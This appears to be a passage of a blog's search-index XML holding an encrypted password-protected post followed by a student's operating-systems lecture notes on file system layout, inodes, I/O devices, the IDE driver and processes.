7afa38d70dff6825e5ca8f678ffbb9bd2ad04ced181ef89b94618d2dc21dab2267bae279f8a8fa9cb250c0f9fe1adddb1a9b47228e364705ff6ae4dcbcc93852724b944d910be5ded09979234ae8c9f094f7fb179bd67171862daf79815bba1f34c4eb2b7e94f4e9ab048c520fd39efa6ba0a7590bd637baa22a209c2c40ac7c20bc0eb549cfb4bf4732e885d9d851f242d2e1d5f76e2f7e8b0fa5590378548a8a125ce9926fa5934560d918ed5a8a5cf98b6e29f85ffb933c58dc8a309884740a791cb025f866ca4e57670b218881891e8ca16ca840c95a1d366904128020c8e6e3712559e3322c40c61afbb43f06f017740ddd136f8a8cb0952125a01f71ab2e002f6eaf2869f737d830bf7fa05739959d65f35237d2c28d7d329f6f2940c8ac38fa343a03be0dd8d3df986d11b002245a6a12402e4419d73fe1b460d502bab392f31689b0ae71023e1cae86d210799e6dc6af902c055312a666c2ee6cfc164a7bacf04f73891f07d4508788333a2ba322e9790587e9a55434eef2f8d2cd0a2b3c886304f61bb2466a9c79c0da9e89763459e0dea32363a494095e022717618b1b8d2e1b0a24c68ebc25ba83667e78326278840a31555f5796ab170437a69a46eefdf495198cb2e1cb7a76cf8308b6702f9d4424014f9f8957f72fda8413bf69bfb4f0d438105f1595d049289b1a9f8773c905751cb4420f4ec7d95c9894014a28c41a0d70455e87e5c9db5548649a5eea3d7f319cfabd1003b1bf273987597e823911e9d72f9a3da90d7fecea9dfbbe1c7e90a91f799d6002e15c030f000b4a497cba0ca89c727dd9f8c804553cc96596d59cc6b66e4a3931aab6631c56fd6c36f582e4a82cdf9a4c7a12dbd7c4439d3f8813ebe1d02fb618b7c07c876fa3f788e3ff72ebbf04bc6cd992cafe79b41e9b6a7dc5b0d953b3911b44e864de322e621318ece6a5bb8338c719c7f2a16a8343709c24c5e319cb84971e8ea3754d7d4b5ae090e268b3eafb4d0756962566f9d3bc4c16df4091f0e15cc4480628baa973e468707fc666cd0e0e14655640ab0776b733f0976230697688a8bbc316387b90fe30549abccb0083032b72e2e8baf22888cfb6899faf05e27d22bd05001a5d3bfbfc6b8183d4f3828bf1cc96446a6916a623f693567f4b0a603d1dee962f18d2488d8951ba98abefb06a6edd7cd99351ba3dde9a54ed9e4ac2f9f734209edd12575009f3ec93b3692a7c1991851e1a0d127c88b921dd94ba9b3eaab30fdb70e0570965085aa2931c5333b1c87e2b531c7895039a81dc45905639067cf5dbf179896aa3c85c1d32bcd13a03682be22cd080fc0399ecd49149a05bdb5ee71165682d263f49b772dc31eda330977f1a76f2264c4668d9f5c93ed163fe579d37b02ff0d37944a2b0d1df481652941ff75a24c7b18f76aa13d8152aaf79e271cd27455c283379957570b7c187870a71cc05041f2a211841dbfd83f2d439fc75ab6e61700185e5a601e779ca61083f79557a423a0bcfc96e7f9ac4109aff8a751d7e1fd8e1e65daa67947b6f9061344d7d0637fc53d24cf6285bf150bdc6816243ffcee589f0451d4ba5cfa80a5c31fe1fbf584d835ff630282527e7182ad788479c4c4d0897e29a9607c76ac607c2210b74f5a1bcfba21bf0eb67d550162b69f1bb9b37893aa5bc50eb0935a60fd286ceadb4cc9fdcf898b9acc614e8c545d146cdb761eeada6116b8679c928c0ecf26ce76d3a93cac8ac9195bf6fd5264faed4b2da3fef5d478ee2ef5ddd24198a4638300e4f8658446ff481bdbc9e3171ff5bcaf402daeb19dd9bf6deca0c7998d54a35dff7d1c666cc19dc2e84cabb13950063e7e15b87767be3e8509534894355cc7026817baea2677fd0b8f61ed307e0064becd7eb52853edb7a44b39c897ad1f6bab6b91d7216c27a093ee5b04e65dc46f74118bf8471eda04ff6829353fe1145b9af9c609e811420656ef2cd13a0f9d6a541fa43950d50895390463261001c819f16cd3552d299b82e8b2ab9b10bc4db63fb3c30cd81a8dc4c266093674b79db3118f2e911e233485f4b4d645b3ca721125d6ea6ee237587c99401a883657d2a1f1888b0ff5e848d4d649fd094508a1ab44184aa9d9a6f2d918efd34d54174993209f194d6fd56274accea7adf2ad24cfbb15461494a0ffc3a4985ae4fcd3a7945f1e9427065b593159af330f766f8097ffc3c4ae3efea52cb9d5ab5cb83fa768a9787114290b8e55581fd33420e6be7de93a02200a85aeb76510d1e7bcf3edec2e9aa51c0fa0a4f652b7b3986bcad4841e1e1396ce7f24edae0147f035317279595e2b09cecc34a776a1c92102866dd5ea085b90f247454573bee0e54f892262b055de92a4bbb739db564745d1fa0b2b8bab16c434cdf3d6156594ffbdf97924cda5fb10b34a1d0858a65e1771e4072b02f48aa8ca3a283d2acfa4f5f48ae48cd908dc2986e07e84476e843ca5699bb8849d3abd7d3e1bd178bdc39c47ece8de58807d0f9bbee33cdf68dff5e65581d56fb8929a629eb5ac60c561586b266520354c1b22ebf06c560c450b9bd91e8953b3f6411e32eeaf5bbb1106fafbf6da3c196e467dc9a07e44203bc2b91e2787b002effe68e4ff9151335cf5babaa2b7658c63b8f8b1509ac83c20991d23266f95fd2aac8fc6e9cd20d94a7ade6e2c69c90b115025822d09f66481671b6eb94b4db6fc19ff8b548d75e444ab4d6bd044b50cc7f46a3a1f887d59d0ee603ebd78b4022db6d956bf38aadd6d82dc34170688025516c13b7d779f63b1a2736e9d161c6dd327a43972e77334ac1aedb168c0ce8ef5caa3c579681e3429e6ddf4172495939eb076cfa79e6f1e1a885824cd06b301ecaf72f9af552d955e3b733818b1c71097606671f79d7eecc8ee7644696ac12dd4859fc73fecda6769db0eb85a81764f5a4369888e6ca144cff25bf86c0c463ae388aaa75c864638c5b96c3714c84506408c19d3cabad2ad0ea184dd41e874744df901306e63386de8fb37ff4c5f39ec3570dd206653dd4d1d16676db6007752081ee12e5995b3ee3559ac699f46daf9ff555393f1d5e3168dd31d6ca84066a706db2e547eec6a41b9681e909c807dad38bafeef136ee7fa7fbabaa6adeff060a50382b2940663f6ad30f8b62064f8d3ce240369cbe5a44fc032ed3869561930829fd768bac550d987cc8d55fdab5118b9875ef64c49e2529ac00a19bb3430ed20905b7103669ce4f5a6d067de03230279e40069e4722cfa70da83cf4d16c19b55208ee785c2a7a9d58efa7c537324b347fa51231e8b5c5088d2f1820d45cff3aa88680d6b3f785759a6dd8adf4e1839a828d97b1c9488791bfb1ecee23017b9a297fa9eeb52814c0e9395ccbf02fdddd5dc64d6e2618405a1a6cf0547ef5872f02a3fbe91ef74c9330615f78c426b8e359fd6364c6c3d7cfc3365a8f94c21a6d55659dbaab67521b7022e164b66470d87f7aac2bc7e1158e1b5c358e969a74d61e9bd7ad5bc3052e1ec0db0a1fdc91d6687cb242348b77fd8500aabcca109dc6d3819bccf0b99eaeac49ecbcb84142b663642bcde51d2c2511835c1fc542602fcc5b526261ab4b7c81eb268310</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/myBlog/lib/hbe.js"></script><link href="/myBlog/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>CSCI3180</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3150 - Presistence (File System Implementation)</title>
    <url>/myBlog/2022/10/14/2022/CSCI3150/2022-10-14-CSCI3150-Presistence-FileSystemImplementation/</url>
    <content><![CDATA[<h2 id="Overall-Organization"><a href="#Overall-Organization" class="headerlink" title="Overall Organization"></a>Overall Organization</h2><ol>
<li><p><strong>On-Disk Organization</strong></p>
<ul>
<li>a series of blocks (e.g. size of each block is 4KB).</li>
<li>the blocks are addressed from 0 to N-1.</li>
</ul>
</li>
<li><p><strong>File System Organization</strong></p>
<ol>
<li><p><font color="#F54747"><strong>Metadata Region</strong></font>: tracks data and file system information</p>
<ol>
<li><p><font color="#F54747">Inode Table</font>:  the collection of all inodes</p>
<ul>
<li>There are 3 to 7 blocks for inode tables and each inode size is 256 bytes.</li>
<li>The file system can contain $ \frac{4 \cdot 7 \cdot 1024}{256} $ &#x3D; 80 inodes (i.e. maximum number of files).</li>
</ul>
</li>
<li><p><font color="#F54747">Bitmap</font>: to track whether inodes or data blocks are free or allocated</p>
<ul>
<li><font color="#3A75EA">data bitmap</font>: for data blocks in data region</li>
<li><font color="#3A75EA">inode bitmap</font>: for inode table</li>
</ul>
</li>
<li><p><font color="#F54747">Superblock</font>: tracks a file system</p>
<ul>
<li>It contains the <font color="#3A75EA">information</font> for the particular file system (e.g. the number of inodes, the begin location of inode table).</li>
</ul>
</li>
</ol>
</li>
<li><p><font color="#F54747"><strong>Data Region</strong></font>: stores user data and occupies most space</p>
</li>
</ol>
 <img src="https://p.ipic.vip/mvkrfc.png" width="500px" /></li>
</ol>
<h2 id="File-Organization"><a href="#File-Organization" class="headerlink" title="File Organization"></a>File Organization</h2><h3 id="Inode"><a href="#Inode" class="headerlink" title="Inode"></a>Inode</h3><ol>
<li><p>Inode</p>
<ul>
<li>Contains all the information about a file.</li>
<li>e.g. file type, size, protection information, time information, etc.</li>
</ul>
</li>
<li><p><strong><font color="#F54747">Direct Pointers</font></strong>: points to a data block explicitly</p>
<ul>
<li>Design of inode: <mark>How it refers to where data blocks are</mark>.</li>
<li>File system calculate where the data block that the inode refers to.</li>
<li>For example, given an inode number 32, calculate the offset into the inode region (32 $\times$ sizeof(inode)) &#x3D; 8192. Then, adding the start address of the inode table (12KB) + inode region (8KB) &#x3D; 20 KB and we can get the location of data block. <img src="https://p.ipic.vip/4m97x2.png" width="500px" /></li>
</ul>
</li>
<li><p>Storage</p>
 <img src="https://p.ipic.vip/d854yi.png" width="500px" />

<ul>
<li>The size of an inode is 60 bytes, and suppose each block number is 4 bytes, so we can store 15 blocks in total.<br> Suppose each data block is 4KB, the maximum file size is 15 $\times$ 4 &#x3D; 60KB.</li>
<li>Therefore, it is hard to support files of big sizes.</li>
</ul>
</li>
</ol>
<h3 id="Multi-Level-Index"><a href="#Multi-Level-Index" class="headerlink" title="Multi-Level Index"></a>Multi-Level Index</h3><ol>
<li><p><strong><font color="#F54747">Indirect Pointer</font></strong>: points to a block that contains (multiple) pointers to data blocks</p>
<ul>
<li>The maximum file size &#x3D; (12 + 1024) $\times$ 4KB $\approx$ 4MB.</li>
<li>Because each inode is 4 bytes and each block is 4KB, so we can hold 1024 inodes, then the file size is 1K $\times$ 4KB &#x3D; 4MB.</li>
</ul>
</li>
<li><p><strong><font color="#F54747">Double Indirect Pointer</font></strong>: points to pointers to indirect blocks</p>
<ul>
<li>The maximum file size &#x3D; (12 + 1024 $\times$ 1024) $\times$ 4KB $\approx$ 1 million 4KB blocks.</li>
</ul>
</li>
<li><p><strong><font color="#F54747">Triple Indirect Pointer</font></strong>: points to pointers to pointers to indirect block</p>
<ul>
<li>The maximum file size &#x3D; (12 + 1024 + 1024$^2$) $\times$ 4KB $\approx$ 4GB.</li>
</ul>
</li>
</ol>
<h2 id="Directory-Organization"><a href="#Directory-Organization" class="headerlink" title="Directory Organization"></a>Directory Organization</h2><ol>
<li><p>Directory</p>
<ul>
<li>Directory contains a list of (entry name, inode number) pairs.</li>
<li>Each directory has two extra file: <ul>
<li><code>.</code> : current directory</li>
<li><code>..</code> : parent directory</li>
</ul>
</li>
<li>For example: <code>dir</code> has three files : <code>foo</code>, <code>bar</code>, <code>foobar_is_a_pretty_longname</code>.</li>
</ul>
</li>
<li><p>Free Space Management</p>
<ul>
<li>File system track which inode and data block are free to use.</li>
<li>Two simple bitmaps are used to manage the free space.<ul>
<li>When file is newly created, it allocated the inode by searching the inode bitmap and update on-disk bitmap.</li>
<li>Pre-allocation policy is commonly used for allocate contiguous blocks.</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="Access-Paths"><a href="#Access-Paths" class="headerlink" title="Access Paths"></a>Access Paths</h2><h3 id="Reading-File-from-Disk"><a href="#Reading-File-from-Disk" class="headerlink" title="Reading File from Disk"></a>Reading File from Disk</h3><ul>
<li><p><code>open(&quot;/foo/bar&quot;, O_RDONLY)</code></p>
<ol>
<li>Traverse the pathname and thus locate the desired inode.</li>
<li>Begin at the root of the file system (<code>/</code>).</li>
<li>File system reads in the block that contains inode number 2 (the root inode number in most Unix file system).</li>
<li>Look inside of the content of root to find pointer to data blocks.</li>
<li>By reading in one or more directory data block, and find “foo” directory finally.</li>
<li>Tranverse recursively the path name until the desired inode (“bar”).</li>
<li>Check the finale permissions (權限), allocate a file descriptor for this process and return the file descriptor.</li>
</ol>
</li>
<li><p><code>read()</code> and <code>close()</code></p>
<ol>
<li>Read in the first block of the file, consulting the inode to find the location of that block.<ul>
<li><font color="F54747">Update the inode</font> with a new last accessed time.</li>
<li><font color="F54747">Update in-memory open file table</font> for file descriptor (i.e. the file offset).</li>
</ul>
</li>
<li>When the file is closed, the file descriptor should be disallocated.<ul>
<li><font color="F54747">NO disk I&#x2F;Os take place</font>.</li>
</ul>
</li>
</ol>
</li>
<li><p>Timeline for reading file from disk:</p>
  <img src="https://p.ipic.vip/5sdw6u.png" width="700px" /></li>
</ul>
<h3 id="Writing-to-Disk"><a href="#Writing-to-Disk" class="headerlink" title="Writing to Disk"></a>Writing to Disk</h3><ul>
<li><p><code>write()</code>: update the file with new contents</p>
<ul>
<li>Need to update <font color="3A75EA">data block</font> and <font color="3A75EA">data bitmap</font>.</li>
<li>Generates 5 I&#x2F;Os:<ol>
<li><font color="F54747">read</font> the <font color="3A75EA"> data bitmap</font></li>
<li><font color="F54747">write</font> the <font color="3A75EA"> data bitmap</font> (to reflect its new state to disk)</li>
<li><font color="F54747">read</font> the <font color="3A75EA">inode</font></li>
<li><font color="F54747">write</font> the <font color="3A75EA">inode</font></li>
<li><font color="F54747">write</font> the <font color="3A75EA">actual block</font> itself</li>
</ol>
</li>
<li>Need to allocate space or directory for creating file, it causes high I&#x2F;O traffic.</li>
</ul>
</li>
<li><p>Timeline for writing to disk:</p>
  <img src="https://p.ipic.vip/3cxwd2.png" width="700px" /></li>
</ul>
<h2 id="Caching-amp-Buffering"><a href="#Caching-amp-Buffering" class="headerlink" title="Caching &amp; Buffering"></a>Caching &amp; Buffering</h2><ol>
<li><p>Problems:</p>
<ul>
<li>Reading and writing files are expensive because it incurs many I&#x2F;Os.<ul>
<li>For example, long pathname (<code>/dir1/dir2/.../dir100/file.txt</code>)</li>
<li>It performs hundreds of reads in order to open the file (one to read the inode of the directory and at least one to read its data).</li>
</ul>
</li>
</ul>
</li>
<li><p>Solutions:</p>
<ol>
<li><p>Read &amp; Cache</p>
<ul>
<li>To reduce the I&#x2F;O traffic, file system uses system memory (DRAM) to cache.<ul>
<li>Early, file system uses fixed-size cache to hold the popular blocks, but it is wasting memory.</li>
<li>Now, model system uses <font color="3A75EA">dynamic partitioning approach</font> and <font color="3A75EA">unified page cache</font>.</li>
</ul>
</li>
<li>Thus, read I&#x2F;O can be avoided by the cache.</li>
</ul>
</li>
<li><p>Write &amp; Buffer</p>
<ul>
<li>Since write traffic has to go to the disk for persistent, cache does not reduce write I&#x2F;Os.</li>
<li>File system uses write buffering for writing performance benefits.<ul>
<li>It can delay writes such that the file system batch some updates into a smaller set of I&#x2F;Os.</li>
<li>By buffering a number of writes in memory, the file system can schedule the subsequent I&#x2F;Os.</li>
</ul>
</li>
<li>Some application force flush data to the disk by calling <code>fsync()</code> or direct I&#x2F;O.</li>
</ul>
</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3150 - Presistence (I/O Devices)</title>
    <url>/myBlog/2022/10/26/2022/CSCI3150/2022-10-26-CSCI3150-Presistence-IODevice/</url>
    <content><![CDATA[<h2 id="I-x2F-O-System-Architecture"><a href="#I-x2F-O-System-Architecture" class="headerlink" title="I&#x2F;O System Architecture"></a>I&#x2F;O System Architecture</h2><img src="https://p.ipic.vip/7li9ig.png" width="600px"/>

<ol>
<li><p>Buses</p>
<ul>
<li>Data paths that used to communicate information with the CPU(s), RAM and I&#x2F;O Devices.</li>
<li><font color="3A75EA">CPU</font> is attached to the <font color="3A75EA">main memory</font> of the system via a <font color="F54747">memory bus</font>.</li>
<li><font color="3A75EA">Some devices</font> are connected to the <font color="3A75EA">system</font> via a <font color="F54747">general I&#x2F;O bus</font>.</li>
</ul>
</li>
<li><p>I&#x2F;O Bus</p>
<ul>
<li>data path that connects CPU to I&#x2F;O Devices.</li>
<li>I&#x2F;O Device is connected to I&#x2F;O bus by three hardware components:<ol>
<li>I&#x2F;O ports</li>
<li>interfaces</li>
<li>device controllers</li>
</ol>
</li>
</ul>
</li>
</ol>
<h2 id="Canonical-Device"><a href="#Canonical-Device" class="headerlink" title="Canonical Device"></a>Canonical Device</h2><img src="https://p.ipic.vip/ofaiph.png" width="600px"/>

<h3 id="Hardware-Interface"><a href="#Hardware-Interface" class="headerlink" title="Hardware Interface"></a>Hardware Interface</h3><ul>
<li><p>Allows the system software to control its operation</p>
</li>
<li><p>Operating system can control the device behavior by reading and writing the following registers:</p>
<ol>
<li><p><font color="F54747">status register</font></p>
<ul>
<li>see the current status of the device</li>
</ul>
</li>
<li><p><font color="F54747">command register</font></p>
<ul>
<li>tell the device to perform a certain task</li>
</ul>
</li>
<li><p><font color="F54747">data register</font></p>
<ul>
<li>pass data to the device or get data from the device</li>
</ul>
</li>
</ol>
</li>
<li><p>Tipical interaction example:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( STATUS == BUSY) ; <span class="comment">// wait until device is not busy</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// write data to data register</span></span><br><span class="line"><span class="comment">// write command to command register</span></span><br><span class="line">    <span class="comment">// starts the device and executes the command</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ( STATUS == BUSY ) ; <span class="comment">// wait until device is done with your request</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Internals"><a href="#Internals" class="headerlink" title="Internals"></a>Internals</h3><ul>
<li>Implement the specific operations</li>
</ul>
<h2 id="General-Mechanisms"><a href="#General-Mechanisms" class="headerlink" title="General Mechanisms"></a>General Mechanisms</h2><h3 id="Polling"><a href="#Polling" class="headerlink" title="Polling"></a>Polling</h3><ul>
<li><p>Operating system waits until the device is ready by repeatedly reading the status register.</p>
</li>
<li><p>Advantages:</p>
<ul>
<li>simple and it works.</li>
</ul>
</li>
<li><p>Disadvantages:</p>
<ul>
<li>it wastes CPU time for just waiting for the device,<br>  so switching to another process during the waiting time may be a better utilize of CPU.</li>
</ul>
</li>
</ul>
<img src="https://p.ipic.vip/9dtgq2.png" width="600px"/>



<h3 id="Interrupt"><a href="#Interrupt" class="headerlink" title="Interrupt"></a>Interrupt</h3><ul>
<li><p>Put the I&#x2F;O request process to <font color="3A75EA">sleep</font> and context switch to another process.</p>
</li>
<li><p>When the device is finished, <font color="3A75EA">wake</font> the process (waiting for the device finished) by interrupt.</p>
</li>
<li><p>Advantages:</p>
<ul>
<li>allow CPU and the disk are properly utilized.</li>
</ul>
</li>
<li><p>Noted: interrupt is not always the best</p>
<ul>
<li>Because context switch is <font color="3A75EA">expensive</font>, if the device performs very fast, then interrupt will slow down the system.<ul>
<li>If the device is fast, then polling is the best</li>
<li>Otherwise, interrupt is the best</li>
</ul>
</li>
</ul>
</li>
</ul>
<img src="https://p.ipic.vip/wff0s5.png" width="600px"/>



<h3 id="Direct-Memory-Access"><a href="#Direct-Memory-Access" class="headerlink" title="Direct Memory Access"></a>Direct Memory Access</h3><ol>
<li><p>Problems:</p>
<ul>
<li>CPU wastes a lot of time to copy a large chunk of data from memory to the device. <img src="https://p.ipic.vip/y3hdm9.png" width="600px"/></li>
</ul>
</li>
<li><p>Solution: Direct Memory Access DMA</p>
<ul>
<li>Copy data in memory by knowing the <font color="3A75EA">location of data in memory</font> and the <font color="3A75EA">number of data block need to copy</font>.</li>
<li>When the copying finished, DMA raises an interrupt on the disk. <img src="https://p.ipic.vip/hj1xbw.png" width="600px"/></li>
</ul>
</li>
</ol>
<h2 id="Device-Interacftions"><a href="#Device-Interacftions" class="headerlink" title="Device Interacftions"></a>Device Interacftions</h2><ul>
<li>The communications between operating system and device<ol>
<li><p><font color="F54747">I&#x2F;O Instructions</font></p>
<ul>
<li>a way for the OS to send data to specific device registers</li>
<li>e.g., <code>in</code> and <code>out</code> instructions on x86.</li>
</ul>
</li>
<li><p><font color="F54747">Memory-mapped I&#x2F;O</font></p>
<ul>
<li>a specific area inside the memory for the I&#x2F;O device (those device registers are available as memory locations).</li>
<li>i.e., the OS <code>load</code> (read) and <code>store</code> (write) to the <font color="3A75EA">device</font>, instead of <font color="3A75EA">the main memory</font>.</li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="File-System-Abstraction"><a href="#File-System-Abstraction" class="headerlink" title="File System Abstraction"></a>File System Abstraction</h3><ul>
<li><p>The abstraction excapsulate the specifics of device interaction which lets the OS can interact with different specific interfaces.</p>
<img src="https://p.ipic.vip/c4raa3.png" width="600px"/>
</li>
<li><p>Problems:</p>
<ul>
<li>If there is a device having many special undefined functions, then these functions will go unused in the generic interface layer</li>
<li>Over 70% of OS code is found in device drives<ul>
<li>it takes lots of times to drive the devices</li>
<li>those devices are the primary contributors to kernel crashes</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Simple-IDE-Disk-Driver"><a href="#Simple-IDE-Disk-Driver" class="headerlink" title="Simple IDE Disk Driver"></a>Simple IDE Disk Driver</h2><h3 id="Registers"><a href="#Registers" class="headerlink" title="Registers"></a>Registers</h3><ol>
<li><p>Control Register</p>
<ul>
<li>Address <code>0x3F6 = 0X80 (0000 1RE0)</code>:<ul>
<li><code>R</code> &#x3D; reset</li>
<li><code>E = 0</code> means “enable interrupt”</li>
</ul>
</li>
</ul>
</li>
<li><p>Command Block Registers</p>
<ul>
<li>Address <code>0x1F0</code> &#x3D; Data Port</li>
<li>Address <code>0x1F1</code> &#x3D; Error</li>
<li>Address <code>0x1F2</code> &#x3D; Sector Count</li>
<li>Address <code>0x1F3</code> &#x3D; LBA low byte</li>
<li>Address <code>0x1F4</code> &#x3D; LBA mid byte</li>
<li>Address <code>0x1F5</code> &#x3D; LBA hi byte</li>
<li>Address <code>0x1F6 = 1B1D TOP4LBA</code> : B &#x3D; LBA, D &#x3D; drive</li>
<li>Address <code>0x1F7</code> &#x3D; Command &#x2F; Status</li>
</ul>
</li>
<li><p>Status Register (Address <code>0x1F7</code>):</p>
<ul>
<li><code>7</code> : <code>BUSY</code></li>
<li><code>6</code> : <code>READY</code></li>
<li><code>5</code> : <code>FAULT</code></li>
<li><code>4</code> : <code>SEEK</code></li>
<li><code>3</code> : <code>DRQ</code></li>
<li><code>2</code> : <code>CORR</code></li>
<li><code>1</code> : <code>IDDEX</code></li>
<li><code>0</code> : <code>ERROR</code></li>
</ul>
</li>
<li><p>Error Register (Address <code>0x1F1</code>)</p>
<ul>
<li><code>7</code> : <code>BBK</code> (Bad Block)</li>
<li><code>6</code> : <code>UNC</code> (Uncorrectable data error)</li>
<li><code>5</code> : <code>MC</code> (Media Changed)</li>
<li><code>4</code> : <code>IDNF</code> (ID mark Not Found)</li>
<li><code>3</code> : <code>MCR</code> (Media Change Requested)</li>
<li><code>2</code> : <code>ABRT</code> (Command aborted)</li>
<li><code>1</code> : <code>T0NF</code> (Track 0 Not Found)</li>
<li><code>0</code> : <code>AMNF</code> (Address Mark Not Found)</li>
</ul>
</li>
</ol>
<h3 id="Operations"><a href="#Operations" class="headerlink" title="Operations"></a>Operations</h3><ol>
<li><p>Wait for drive to be ready</p>
<ul>
<li>Read Status Register until drive is not busy and <code>READY</code>.</li>
</ul>
</li>
<li><p>Write parameters to command registers</p>
<ul>
<li>Wite the sector count, logical block address (LBA) of the sectors to be accessed, and drive number (<code>master=0x00</code> or <code>slave=0x10</code>, as IDE permits just two drives) to command registers (<code>0x1F2</code> - <code>0x1F6</code>).</li>
</ul>
</li>
<li><p>Start the I&#x2F;O</p>
<ul>
<li>Issuing read&#x2F; write to command register.</li>
<li>Write <code>READ—WRITE</code> command to command register (<code>0x1F7</code>).</li>
</ul>
</li>
<li><p>Data transfer (for writes)</p>
<ul>
<li>Wait until the drive status is <code>READY</code> and <code>DRQ</code>, write data to data port.</li>
</ul>
</li>
<li><p>Handle interrupts</p>
<ul>
<li>In the simplest case, handle an interrupt for each sector transferred.</li>
<li>More complex approaches allow batching.</li>
</ul>
</li>
<li><p>Handle errors</p>
<ul>
<li>After each operation, read the status register. If the <code>ERROR</code> bit is on, read the error register for details.</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3150 - Virtualizing CPU (Process)</title>
    <url>/myBlog/2022/10/27/2022/CSCI3150/2022-10-27-CSCI3150-Virtualizing-CPU-Process/</url>
    <content><![CDATA[<h2 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h2><ul>
<li>Process is a running program, which includes:<ol>
<li>Memory (address space)<ul>
<li>Instructions</li>
<li>Data sections</li>
</ul>
</li>
<li>Registers<ul>
<li>Program counter</li>
<li>Stack pointer</li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="Process-API"><a href="#Process-API" class="headerlink" title="Process API"></a>Process API</h3><ol>
<li><p><code>Create</code></p>
<ul>
<li>create a new process to run a program</li>
</ul>
</li>
<li><p><code>Destory</code></p>
<ul>
<li>halt a runaway process</li>
</ul>
</li>
<li><p><code>Wait</code></p>
<ul>
<li>wait for a process to stop running</li>
</ul>
</li>
<li><p><code>Miscellaneous Control</code></p>
<ul>
<li>some kind of method to suspend a process and then resume it (暫停然後恢復)</li>
</ul>
</li>
<li><p><code>Status</code></p>
<ul>
<li>get some status information about a process</li>
</ul>
</li>
</ol>
<h3 id="Process-Creation"><a href="#Process-Creation" class="headerlink" title="Process Creation"></a>Process Creation</h3><ol>
<li><p>Load a program code into <font color="F54747">memory</font>, then build up an <font color="F54747">address space</font> for the process.</p>
<ul>
<li>The OS performs the loading process lazily, it loads the pieces of code or data <font color="3A75EA">only when they are needed</font> during the program execution.</li>
</ul>
</li>
<li><p>Allocate the program’s run-time <font color="F54747">process stack</font> (store at the bottom of the address space)</p>
<ul>
<li><p>Used for <font color="3A75EA">local variables</font>, <font color="3A75EA">function parameters</font> and <font color="3A75EA">return address</font>.</p>
</li>
<li><p>Initialize the stack with arguments <code>argc</code> and the <code>argv</code> array of <code>main()</code> function.</p>
</li>
</ul>
</li>
<li><p>Create the program’s <font color="F54747">heap</font> (store at the position that after the coding)</p>
<ul>
<li>Used for <font color="3A75EA">requesting dynamically allocated data</font>.</li>
<li>Program requests such space by calling <code>malloc()</code> and free it by calling <code>free()</code>.</li>
</ul>
</li>
<li><p>Do the initialization tasks</p>
<ul>
<li>Input &#x2F; Output setup<ul>
<li>each process has three open file descriptors in default</li>
<li>standard input, output an error</li>
</ul>
</li>
</ul>
</li>
<li><p>Start the program running at the entry point (<code>main()</code>)</p>
</li>
</ol>
<img src="https://p.ipic.vip/h01f63.png" width="500px">



<h3 id="Process-Status"><a href="#Process-Status" class="headerlink" title="Process Status"></a>Process Status</h3><ol>
<li><p>Running</p>
<ul>
<li>A process is running on a processor.</li>
</ul>
</li>
<li><p>Ready</p>
<ul>
<li>A process is ready to run but for some reason the OS has chosen <font color="3A75EA">not to run it</font> at the moment.</li>
</ul>
</li>
<li><p>Blocked</p>
<ul>
<li>A process has performed some kind of operation.</li>
<li>When a process initiates an I&#x2F;O request to a disk, it becomes <font color="3A75EA">blocked</font> and thus some other process can use the processor.<img src="https://p.ipic.vip/n3v5i6.png" width="400px"></li>
</ul>
</li>
</ol>
<h3 id="Data-Structures"><a href="#Data-Structures" class="headerlink" title="Data Structures"></a>Data Structures</h3><ul>
<li>In the OS system, the key data structure<ol>
<li><p><strong>Process List</strong></p>
<ul>
<li>Current running process</li>
<li>Ready processes</li>
<li>Blocked processes</li>
</ul>
</li>
<li><p><strong>Register Context</strong></p>
<ul>
<li>the registers we need to run the process.</li>
</ul>
</li>
<li><p><strong>Process Control Block</strong></p>
<ul>
<li>For each process, there is an in-memory data structure that contains information about that process.</li>
</ul>
</li>
</ol>
</li>
</ul>
<h2 id="Execution-Mechanism"><a href="#Execution-Mechanism" class="headerlink" title="Execution Mechanism"></a>Execution Mechanism</h2><ul>
<li>The OS need to share the physical CPU by <font color="F54747">time sharing</font>,<br><font color="3A75EA">i.e., How we implement time sharing among multiple processes</font>.<ol>
<li><strong>Performance</strong>: How can we implement virtualization <font color="3A75EA">without add excessive overhead</font> to the system?</li>
<li><strong>Control</strong>: How can we run processes efficiently while <font color="3A75EA">retaining control</font> over the CPU?</li>
</ol>
</li>
</ul>
<h3 id="Direct-Execution"><a href="#Direct-Execution" class="headerlink" title="Direct Execution"></a>Direct Execution</h3><h4 id="Execution-Procedure"><a href="#Execution-Procedure" class="headerlink" title="Execution Procedure"></a>Execution Procedure</h4><img src="https://p.ipic.vip/so5ak6.png" width="500px">
<!-- | OS | Program |
| :--- | :--- |
| 1. Create entry for the process list | |
| 2. Allocate memory for the program | |
| 3. Load program into the memory | |
| 4. Set up stack with `argc` / `argv` | |
| 5. Clear registers | |
| 6. Execute call `main()` | |
| | 7. Run `main()` |
| | 8. Execute `return` from `main()` |
| 9. Free memory of process | |
| 10. Remove from process list | | -->


<h4 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h4><ul>
<li><p><strong>Problem</strong>: <font color="F54747"><strong>Restricted Operation</strong></font></p>
<ul>
<li>if a process wishes to perform some kind of restricted operation (受限的操作), such as,<ul>
<li>issung an I&#x2F;O request to a disk</li>
